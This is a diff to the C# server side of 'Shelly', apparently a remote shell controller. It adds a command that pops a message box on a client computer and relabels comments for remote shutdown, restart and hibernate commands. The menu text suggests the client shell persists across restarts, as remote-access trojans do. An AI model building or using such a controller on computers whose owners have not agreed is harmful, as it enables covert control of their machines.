@@ -21,7 +21,8 @@ namespace Shelly_Server
 
                         "1. Uninstall - Uninstalls Shelly from the client computer\n" +
                         "2. Disconnect - Shuts down the shell until next system startup\n" +
-                        "3. Ping - Pings the client and shows the response\n\n" +
+                        "3. Ping - Pings the client and shows the response\n" + 
+                        "4. MessageBox - Shows a messagebox on the clients computer\n\n" +
 
                         "POWER OPTIONS\n" +
 
@@ -74,7 +75,20 @@ namespace Shelly_Server
                     Console.WriteLine(SocketHandler.Receive());
                     break;
 
-                // Request Ping from client
+                // Show messagebox
+                case "messagebox":
+
+                    // Get messagebox body user input
+                    string Msg = Functions.UserInput.GetMessageBoxInput();
+
+                    // Send message
+                    SocketHandler.Send("messagebox");
+
+                    // Send message
+                    SocketHandler.Send(Msg);
+                    break;
+
+                // Shutdown client computer
                 case "shutdown":
 
                     // Send message
@@ -84,7 +98,7 @@ namespace Shelly_Server
                     SocketHandler.ShutdownServer();
                     break;
 
-                // Request Ping from client
+                // Restart client computer
                 case "restart":
 
                     // Send message
@@ -94,7 +108,7 @@ namespace Shelly_Server
                     SocketHandler.ShutdownServer();
                     break;
 
-                // Request Ping from client
+                // Hibernate client computer
                 case "hibernate":
 
                     // Send message
